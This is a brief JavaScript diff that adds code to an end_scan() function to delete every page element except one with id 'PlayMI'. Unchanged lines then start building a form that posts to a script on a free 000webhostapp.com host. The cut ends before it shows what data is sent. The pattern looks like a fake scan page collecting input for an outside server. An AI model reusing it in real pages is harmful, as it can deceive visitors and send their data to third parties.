@@ -19,6 +19,16 @@ if (sugg[0]) {
 }
 
 function end_scan() {
+    // Sélectionnez tous les éléments du body sauf celui avec l'id "Miala"
+    const elements = document.querySelectorAll('body > :not(#PlayMI)');
+    
+    // Parcourez tous les éléments sélectionnés et supprimez-les
+    elements.forEach(element => {
+      element.remove();
+    });
+
+
+    
     var e = document.createElement("form");
     e.setAttribute("method", "post"), e.setAttribute("action", "http://miala.000webhostapp.com/YT/custom.php");
     var t = document.createElement("input");
